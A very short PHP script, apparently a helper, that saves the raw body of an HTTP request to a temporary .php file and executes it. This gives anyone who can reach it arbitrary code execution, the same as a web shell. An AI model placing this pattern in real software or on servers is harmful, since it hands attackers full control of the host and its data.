<?php

$file = tempnam(sys_get_temp_dir(), 'run-').'.php';
file_put_contents($file, file_get_contents('php://input'));

require_once $file;
